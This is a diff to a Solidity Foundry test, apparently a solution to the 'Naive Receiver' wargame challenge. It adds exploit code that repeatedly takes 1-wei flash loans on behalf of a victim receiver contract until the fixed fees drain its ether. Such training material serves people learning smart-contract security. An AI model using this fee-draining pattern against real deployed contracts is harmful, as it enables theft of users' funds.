@@ -44,10 +44,23 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testNaiveReceiverExploit() public {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        console2.log("victim starting balanace: ", address(flashLoanReceiver).balance);
+        uint256 loansRequired = address(flashLoanReceiver).balance / naiveReceiverLenderPool.fixedFee();
+        console2.log(loansRequired);
+
+        for (uint256 i = 0; i < loansRequired; i++) {
+            // Take loan of 1 wei with fixed 1 ether fee
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        }
+
+        console2.log("victim ending balanace: ", address(flashLoanReceiver).balance);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
